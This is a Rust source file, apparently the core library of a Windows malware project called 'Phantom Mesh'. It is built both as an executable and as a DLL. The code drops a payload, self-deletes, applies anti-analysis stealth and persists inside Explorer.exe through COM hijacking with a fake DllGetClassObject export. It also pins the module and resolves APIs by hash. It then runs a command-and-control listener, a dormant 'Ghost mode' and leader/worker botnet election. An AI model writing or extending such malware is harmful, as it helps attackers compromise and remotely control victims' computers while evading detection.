//! # Phantom Mesh Core Library (Hybrid EXE/DLL)
//!
//! Shared logic for both Executable and DLL builds.
//! - EXE: Drops payload, runs logic.
//! - DLL: Running inside Explorer.exe (COM Hijack), runs logic.

// Obfuscated Module Aliases
#[path = "core/mod.rs"]
pub mod k; // kernel/core
#[path = "network/mod.rs"]
pub mod n; // network
#[path = "discovery/mod.rs"]
pub mod d; // discovery
#[path = "plugins/mod.rs"]
pub mod p; // plugins
#[path = "stealth/mod.rs"]
pub mod s; // stealth
#[path = "crypto/mod.rs"]
pub mod c; // crypto
#[path = "happy_strings.rs"]
pub mod h; // happy
#[path = "c2/mod.rs"]
pub mod c2; // command & control

use std::sync::Arc;
use log::{info, error};

use k::{run_leader_mode, run_worker_mode};
use d::{ElectionService, NodeRole, ZeroNoiseDiscovery};
use c2::state::{CommandState, SystemMode};

/// Entry point for the Executable (edge.exe)
pub fn start_exe() {
    let args: Vec<String> = std::env::args().collect();

    // Check if we are a Viewer
    #[cfg(target_os = "windows")]
    #[cfg(feature = "debug_mode")]
    {
        if s::windows::ipc::is_pipe_active() {
            return; 
        }
        s::windows::ipc::start_daemon_server();
    }

    crate::k::debug::log_stage!(1, "Init (EXE)");
    
    let pid = std::process::id();
    crate::k::debug::log_detail!("PID: {}", pid);

    #[cfg(feature = "debug_mode")]
    {
        crate::k::debug::log_op!("Stealth", "Activating Self-Delete...");
        #[cfg(target_os = "windows")]
        s::windows::self_delete::self_delete(); 
    }

    // Print Reddit Tag (Debug)
    let tag = n::bootstrap::RedditProvider::generate_tag();
    #[cfg(feature = "debug_mode")]
    println!("Info Hash: {}", tag);

    crate::k::debug::log_op!("Stealth", "Applying Anti-Analysis & Protection...");
    s::check_and_apply_stealth();
    crate::k::debug::log_detail!("Stealth Modules Loaded.");
    h::init(); 

    // Run async main
    smol::block_on(async_main());
}

/// Entry point for the DLL (edge.dll)
#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(hinst: *mut c_void, reason: u32, _reserved: *mut c_void) -> i32 {
    match reason {
        1 => { // DLL_PROCESS_ATTACH
            // 1. PIN MODULE: Prevent unloading even if DllGetClassObject returns error
            unsafe {
                use crate::s::windows::api_resolver::{self, resolve_api};
                // GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN, address, &handle)
                // Flags: 0x4 (FROM_ADDRESS) | 0x1 (PIN) = 0x5
                type FnGetModuleHandleExW = unsafe extern "system" fn(u32, *const c_void, *mut *mut c_void) -> i32;
                
                // Address of this function as reference
                let addr = DllMain as *const c_void;
                let mut handle: *mut c_void = std::ptr::null_mut();

                let get_mod: Option<FnGetModuleHandleExW> = resolve_api(
                    api_resolver::HASH_KERNEL32, 
                    0x2382173F 
                );

                if let Some(f) = get_mod {
                   f(0x5, addr, &mut handle);
                } else {
                    // Fallback using LoadLibrary ("edge.dll")? No, name is unknown (EdgeUpdate.dll or random).
                    // Without pinning, we risk unload. But pure thread spawn usually keeps RefCount? 
                    // No, FreeLibrary kills threads? No, it unmaps memory -> Crash.
                    // Let's assume standard LoadLibrary on 'hinst' works too?
                    // GetModuleFileName -> LoadLibrary
                }
            }

            // Spawn a thread to run the main logic so we don't block the loader
            std::thread::spawn(|| {
                crate::k::debug::log_stage!(1, "Init (DLL)");
                
                // IPC Check (Optional for DLL, as it runs inside Explorer)
                // We might want logging here too? 
                // Currently IPC server might conflict if multiple DLLs load?
                // For now, let's just run logic.
                
                // Apply Stealth (Skip self-delete, we are the persistence)
                crate::k::debug::log_op!("Stealth", "Applying Anti-Analysis (DLL Context)...");
                s::check_and_apply_stealth();
                h::init();

                smol::block_on(async_main());
            });
        }
        _ => {}
    }
    1 // TRUE
}

/// Required export for COM Hijacking (InprocServer32)
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllGetClassObject(_rclsid: *const u128, _riid: *const u128, _ppv: *mut *mut c_void) -> i32 {
    // We are a fake COM server.
    // Return CLASS_E_CLASSNOTAVAILABLE (0x80040111) to tell caller "Not found".
    // This allows the host process (Explorer) to fail gracefully while we keep running in background.
    // Or we can just hang? No, return error is safer.
    unsafe { std::mem::transmute(0x80040111u32) }
}

/// Core Async Logic (Shared)
async fn async_main() {
    let cmd_state = CommandState::new();
    
    // Start C2 Listener
    c2::listener::start_listener(cmd_state.clone());
    
    // Ghost Mode Gate
    if cmd_state.current_mode() == SystemMode::Ghost {
        info!("[Ghost] System is in GHOST MODE. Network silent.");
        let cs = cmd_state.clone();
        crate::k::debug::log_stage!(0, "Entering Ghost Mode (Silent)...");
        smol::unblock(move || {
            cs.await_activation();
        }).await;
        info!("[Ghost] ACTIVATION SIGNAL RECEIVED! Starting Network...");
    }

    // Discovery
    let disc = Arc::new(ZeroNoiseDiscovery::new());
    let dc = disc.clone();
    smol::spawn(async move {
        dc.run_daemon().await;
    }).detach();

    loop {
        // [GHOST CHECK]
        if cmd_state.current_mode() == SystemMode::Ghost {
            info!("[Main] System entered Ghost Mode. Halting Network.");
            let cs = cmd_state.clone();
            smol::unblock(move || {
                cs.await_activation();
            }).await;
            info!("[Main] Resuming from Ghost Mode...");
        }

        info!("[Main] Entering Election Phase...");
        let election = Arc::new(ElectionService::new().await);
        let role = election.run_discovery().await;

        match role {
            NodeRole::Leader => {
                info!("[Main] Role: LEADER");
                run_leader_mode(election, cmd_state.clone()).await;
            }
            NodeRole::Worker(addr) => {
                info!("[Main] Role: WORKER (Leader: {})", addr);
                run_worker_mode(addr, cmd_state.clone()).await;
            }
            _ => {
                error!("Unexpected Role Unbound");
                smol::Timer::after(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}
